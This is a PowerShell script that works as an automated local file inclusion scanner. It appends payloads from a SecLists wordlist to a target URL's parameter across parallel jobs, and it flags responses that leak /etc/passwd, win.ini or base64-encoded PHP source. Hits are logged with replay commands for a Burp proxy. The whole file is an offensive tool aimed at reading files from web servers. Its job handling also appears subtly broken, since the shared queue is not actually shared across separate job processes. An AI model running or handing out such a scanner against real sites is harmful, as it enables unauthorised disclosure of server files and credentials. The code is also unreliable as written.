param(
    [string]$url,  # e.g., "http://target.com/index.php?page="
    [string]$payloadFile = ".\LFI-Jhaddix.txt",  # Path to SecLists LFI payloads
    [string]$outputFile = "lfi_results.txt",
    [int]$threads = 10,
    [switch]$useProxy
)

# Configure proxy (for Burp Suite)
$proxy = "http://127.0.0.1:8080"

# Load payloads from file
if (!(Test-Path $payloadFile)) {
    Write-Host "[!] Payload file not found: $payloadFile" -ForegroundColor Red
    exit
}
$payloads = Get-Content $payloadFile | Where-Object { $_ -ne "" }

# Thread-safe queue of payloads
$queue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
$payloads | ForEach-Object { $queue.Enqueue($_) }

# Job script block
$scriptBlock = {
    param($url, $queue, $outputFile, $useProxy, $proxy)
    while ($true) {
        $success = $queue.TryDequeue([ref]$payload)
        if (-not $success) { break }

        $fullUrl = "$url$payload"
        $userAgent = "Mozilla/5.0 (LFI-Scanner)"
        $headers = @{ "User-Agent" = $userAgent }

        try {
            $options = @{
                Uri = $fullUrl
                Headers = $headers
                UseBasicParsing = $true
                ErrorAction = 'Stop'
            }
            if ($useProxy) { $options.Proxy = $proxy }

            $response = Invoke-WebRequest @options

            if ($response.Content -match "root:.*:0:0:" -or $response.Content -match "\[fonts\]" -or $response.Content -match "PD9waHA=") {
                $result = "[+] Possible LFI: $fullUrl"
                Write-Host $result -ForegroundColor Green
                Add-Content -Path $outputFile -Value $result

                # Save HTTpie command for manual validation
                $cmd = "http --proxy=http://127.0.0.1:8080 '$fullUrl'"
                Add-Content -Path "$outputFile.httpie" -Value $cmd
            } else {
                Write-Host "[-] $fullUrl"
            }
        } catch {
            Write-Host "[!] Error on $fullUrl" -ForegroundColor Yellow
        }
    }
}

# Launch parallel jobs
$jobs = @()
for ($i = 0; $i -lt $threads; $i++) {
    $jobs += Start-Job -ScriptBlock $scriptBlock -ArgumentList $url, $queue, $outputFile, $useProxy.IsPresent, $proxy
}

# Wait for all jobs to complete
$jobs | Wait-Job | ForEach-Object { Receive-Job $_; Remove-Job $_ }

Write-Host "`n[✓] Scanning complete. Results saved to $outputFile"
